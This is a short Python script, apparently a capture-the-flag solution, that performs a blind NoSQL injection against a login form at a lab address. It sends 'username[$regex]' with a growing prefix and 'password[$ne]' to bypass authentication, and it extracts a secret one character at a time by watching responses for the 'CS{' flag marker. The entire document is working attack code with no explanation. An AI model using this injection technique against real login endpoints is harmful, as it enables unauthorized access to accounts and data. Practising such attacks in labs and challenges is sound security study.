import requests
import string

chars = string.printable

def extracao(atual, anterior):
    data = {"username[$regex]": atual + anterior , "password[$ne]": "a"}
    
    r = requests.post("http://10.10.0.11/", data = data)
    return r.text

def main():
    valor_completo = "^"
    
    while True:
        for printable in chars:
            result = extracao(valor_completo, printable)
            if "CS{" in result:
                valor_completo = valor_completo + printable
                break
            print(str(valor_completo) + str(printable))

main()    
